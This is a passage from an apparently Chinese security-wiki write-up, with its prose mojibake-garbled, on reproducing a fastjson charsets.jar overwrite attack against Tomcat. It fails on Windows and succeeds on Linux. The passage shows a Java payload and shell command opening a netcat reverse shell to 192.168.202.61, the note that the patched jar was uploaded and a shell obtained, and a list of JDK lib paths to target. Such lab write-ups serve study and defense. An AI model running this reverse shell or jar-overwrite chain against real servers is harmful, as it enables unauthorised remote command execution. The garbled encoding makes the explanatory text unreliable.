èµ·ä¸æ¥ã€‚</p><p>éš¾é“ä¸€å®šæ˜¯è¦ç”¨æ–‡ä»¶å†™å…¥çš„æ‰è¡Œï¼Ÿç†è®ºä¸Šè‚¯å®šä¸ä¼šï¼Œå¤åˆ¶ä¹Ÿæ˜¯æ–‡ä»¶æ“ä½œå•Šã€‚ä¸ç†è§£ç½‘ä¸Šçš„æ˜¯æ€ä¹ˆå¤ç°çš„ã€‚ã€‚ã€‚</p><p>æ€»ä¹‹è¿™ä¸ªå†™ jar åŒ…åœ¨ Windows ä¸‹æ˜¯å¤ç°å¤±è´¥äº†ï¼Œè¿˜æ˜¯éœ€è¦æ‰¾åˆ°å…¶ä»–æ‡’åŠ è½½çš„ jar åŒ…æ‰è¡Œã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429172022-ezmge4v.6b9d4904.png" alt="image" title="çœ‹éƒ½è¢«å ç”¨äº†" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429171205-tnzpsr5.90e0b942.png" alt="image" loading="lazy">â€‹</p><p><strong>ã€20240430ã€‘</strong></p><p>æ‰æƒ³èµ·æ¥æ˜¯æ˜¯å› ä¸ºæˆ‘çš„ Tomcat è®¾ç½®äº†<a href="https://blog.csdn.net/Monkey_King_GL/article/details/116136985" target="_blank" rel="noopener noreferrer">æ—¥å¿—ä¹±ç <span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>çš„é—®é¢˜ï¼Œä¿®æ”¹äº† <code>\conf\logging.properties</code>â€‹ æ–‡ä»¶</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240430134609-uua18im.1fee1ee9.png" alt="image" loading="lazy">â€‹</p><p>å‘ç°æ”¹å› utf-8 è¿˜æ˜¯è¢«å ç”¨ï¼Œåº”è¯¥å’Œè¿™ä¸ªæ— å…³ï¼Œæˆ–è®¸è¿˜æ˜¯ Windows ä¸‹çš„é—®é¢˜å§ã€‚</p><h4 id="é”™è¯¯" tabindex="-1"><a class="header-anchor" href="#é”™è¯¯"><span>é”™è¯¯</span></a></h4><p>JDK æ²¡æœ‰å¸¦è°ƒè¯•ä¿¡æ¯æ ¹æœ¬å†™ä¸è¿›å»ï¼Œéš¾å—ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSONException</span><span class="token operator">:</span> <span class="token keyword">default</span> constructor not found<span class="token punctuation">.</span> <span class="token keyword">class</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span>MarshalOutputStream</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154120-q02l1kk.2710c1c0.png" alt="image" loading="lazy">â€‹</p><h3 id="linux-ä¸‹æˆåŠŸ" tabindex="-1"><a class="header-anchor" href="#linux-ä¸‹æˆåŠŸ"><span>Linux ä¸‹æˆåŠŸ</span></a></h3><p><strong>ã€ç¯å¢ƒä¿¡æ¯ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code># java <span class="token operator">-</span>version
openjdk version <span class="token string">&quot;1.8.0_402&quot;</span>
<span class="token class-name">OpenJDK</span> <span class="token class-name">Runtime</span> <span class="token class-name">Environment</span> <span class="token punctuation">(</span>build <span class="token number">1.8</span><span class="token number">.0_402</span><span class="token operator">-</span><span class="token number">8</span>u402<span class="token operator">-</span>ga<span class="token operator">-</span><span class="token number">2</span>ubuntu1<span class="token operator">~</span><span class="token number">20.04</span><span class="token operator">-</span>b06<span class="token punctuation">)</span>
<span class="token class-name">OpenJDK</span> <span class="token number">64</span><span class="token operator">-</span><span class="token class-name">Bit</span> <span class="token class-name">Server</span> <span class="token constant">VM</span> <span class="token punctuation">(</span>build <span class="token number">25.402</span><span class="token operator">-</span>b06<span class="token punctuation">,</span> mixed mode<span class="token punctuation">)</span>

# apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span>
# å®˜ç½‘ä¸‹è½½ https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>tomcat<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>download<span class="token operator">-</span><span class="token number">80.</span>cgi
wget https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>dlcdn<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>org<span class="token operator">/</span>tomcat<span class="token operator">/</span>tomcat<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>v8<span class="token punctuation">.</span><span class="token number">5.100</span><span class="token operator">/</span>bin<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz
# è§£å‹å¹¶æ”¾åˆ° home ç›®å½•
tar <span class="token operator">-</span>zxf apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gz

# å¦‚æœä¸èƒ½æ‰§è¡Œ
chmod <span class="token operator">-</span><span class="token class-name">R</span> <span class="token number">755</span> <span class="token punctuation">.</span>/apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span>

# å¯åŠ¨ tomcat
root<span class="token annotation punctuation">@refl4</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>bin# <span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>sh start

# å…³é—­ tomcat
root<span class="token annotation punctuation">@refl4</span><span class="token operator">:</span><span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>bin# <span class="token punctuation">.</span>/catalina<span class="token punctuation">.</span>sh stop

# è§‚å¯Ÿæ—¥å¿—
# tail <span class="token operator">-</span>f <span class="token operator">/</span>home<span class="token operator">/</span>apache<span class="token operator">-</span>tomcat<span class="token operator">-</span><span class="token number">8.5</span><span class="token number">.100</span><span class="token operator">/</span>logs<span class="token operator">/</span>catalina<span class="token punctuation">.</span>out 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€æµ‹è¯•è¿‡ç¨‹ã€‘</strong></p><p>æœç„¶æ˜¯å› ä¸º**<mark>å·²ç»è¢«åŠ è½½è¿‡</mark>**çš„åŸå› ï¼Œé€šè¿‡ä¸‹é¢çš„å‘½ä»¤å¯ä»¥çœ‹åˆ° Ubuntu ä¸‹ charsets.jar åœ¨ tomcat å¯åŠ¨çš„æ—¶å€™æ˜¯ä¸ä¼šåŠ è½½çš„ã€‚</p><ol><li>æŸ¥çœ‹ java ç›¸å…³ä¿¡æ¯</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>// åˆ‡æ¢ jdk ç‰ˆæœ¬
update-alternatives <span class="token parameter variable">--config</span> <span class="token function">java</span>

// æŸ¥çœ‹ jre è·¯å¾„
<span class="token function">ls</span> <span class="token parameter variable">-lrt</span> /etc/alternatives/java

// ä½¿ç”¨ <span class="token function">lsof</span> å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦è¢«æ‰“å¼€
<span class="token function">sudo</span> <span class="token function">lsof</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429174428-dpd7c4a.d9c37d01.png" alt="image" loading="lazy">â€‹</p><ol start="2"><li>å¯åŠ¨ tomcatï¼ˆå› ä¸ºæ˜¯æ‡’åŠ è½½çš„ï¼Œæ‰€ä»¥ç›´æ¥è¦†ç›–äº†å†å¯åŠ¨åœ¨ linux ä¸‹ä¹Ÿä¸ä¼šå—å½±å“ï¼Œä¸åƒ win ä¼šå¯åŠ¨å¤±è´¥ï¼‰</li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>root@refl4:/home/apache-tomcat-8.5.100/bin<span class="token comment"># ./catalina.sh start</span>
Using CATALINA_BASE:   /home/apache-tomcat-8.5.100
Using CATALINA_HOME:   /home/apache-tomcat-8.5.100
Using CATALINA_TMPDIR: /home/apache-tomcat-8.5.100/temp
Using JRE_HOME:        /usr
Using CLASSPATH:       /home/apache-tomcat-8.5.100/bin/bootstrap.jar:/home/apache-tomcat-8.5.100/bin/tomcat-juli.jar
Using CATALINA_OPTS:   
Tomcat started.

// è§¦å‘ä¸€æ¬¡ä¹‹åè®°å¾—åœæ­¢ tomcat ç„¶åé‡å¯ï¼Œæ¸…é™¤ç¼“å­˜
root@refl4:/home/apache-tomcat-8.5.100/bin<span class="token comment"># ./catalina.sh stop</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>è¦†ç›– <code>charsets.jar</code>â€‹ åè®¿é—®ç±»ï¼Œè§¦å‘ç±»åŠ è½½</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429175632-ojbmb5g.fc6caa7c.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429175720-pzv80y6.8db94ed4.png" alt="image" loading="lazy">â€‹</p><ol start="4"><li>åå¼¹ shell æµ‹è¯•</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>File</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    command <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;nc 192.168.202.61 4444 | /bin/sh | nc 192.168.202.61 5555&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    command <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;nc 192.168.202.61 4444 | /bin/sh | nc 192.168.202.61 5555&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://blog.csdn.net/mirocky/article/details/112674080" target="_blank" rel="noopener noreferrer">åå¼¹ shell å¸¸ç”¨å‘½ä»¤_åå¼¹ shell å‘½ä»¤<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>æˆ‘è¿™ä¸ªç¯å¢ƒçš„ nc ä¸æ”¯æŒ <code>-e</code>â€‹ ä¹Ÿä¸æ”¯æŒ <code>-c</code>â€‹ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>nc ip port1 | /bin/sh | nc ip port2</code>â€‹ æ¥è¿›è¡Œåå¼¹ shellã€‚</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># ä½†å‡ºäºå®‰å…¨æ€§è€ƒè™‘ï¼Œå¾ˆå¤š nc æ²¡æœ‰è¿›è¡Œ -e çš„ç¼–è¯‘ï¼Œæ‰§è¡Œåä¼šå‡ºç°ä¸‹é¢çš„ç»“æœã€‚</span>
nc: invalid option -- <span class="token string">&#39;c&#39;</span>
usage: <span class="token function">nc</span> <span class="token punctuation">[</span>-46CDdFhklNnrStUuvZz<span class="token punctuation">]</span> <span class="token punctuation">[</span>-I length<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i interval<span class="token punctuation">]</span> <span class="token punctuation">[</span>-M ttl<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-m minttl<span class="token punctuation">]</span> <span class="token punctuation">[</span>-O length<span class="token punctuation">]</span> <span class="token punctuation">[</span>-P proxy_username<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p source_port<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-q seconds<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s source<span class="token punctuation">]</span> <span class="token punctuation">[</span>-T keyword<span class="token punctuation">]</span> <span class="token punctuation">[</span>-V rtable<span class="token punctuation">]</span> <span class="token punctuation">[</span>-W recvlimit<span class="token punctuation">]</span> <span class="token punctuation">[</span>-w timeout<span class="token punctuation">]</span>
          <span class="token punctuation">[</span>-X proxy_protocol<span class="token punctuation">]</span> <span class="token punctuation">[</span>-x proxy_address<span class="token punctuation">[</span>:port<span class="token punctuation">]</span><span class="token punctuation">]</span>           <span class="token punctuation">[</span>destination<span class="token punctuation">]</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span>

<span class="token comment"># ä½¿ç”¨ä¸‹é¢è¿™ç§æ–¹å¼</span>
<span class="token function">nc</span> <span class="token number">192.168</span>.202.61 <span class="token number">4444</span> <span class="token operator">|</span> /bin/sh <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">192.168</span>.202.61 <span class="token number">5555</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>æ•ˆæœå¦‚ä¸‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429182222-7pqg3by.33ba191a.png" alt="image" loading="lazy">â€‹</p><p>ä¿®æ”¹ jar åŒ…åç¼–è¯‘ä¸Šä¼ æˆåŠŸåå¼¹ shellã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429183038-jwlrxtz.34da28d7.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429182912-e1zyxj0.60aa3a56.png" alt="image" loading="lazy">â€‹</p><h3 id="å¸¸è§-jdk-ç›®å½•è®°å½•" tabindex="-1"><a class="header-anchor" href="#å¸¸è§-jdk-ç›®å½•è®°å½•"><span>å¸¸è§ jdk ç›®å½•è®°å½•</span></a></h3><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>jdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">11.0</span><span class="token number">.3</span><span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">6</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">7</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>openjdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>mnt<span class="token operator">/</span>jdk<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">6.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_111</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>java<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_121</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0_51</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">7.0_76</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_60</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_66</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_74</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_91</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk6<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk7<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle_jdk8<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_101</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_102</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_111</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_131</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_144</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_151</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_152</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_161</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_171</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_172</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_181</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_191</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk1<span class="token punctuation">.</span><span class="token number">8.0_202</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk8u202<span class="token operator">-</span>b08<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
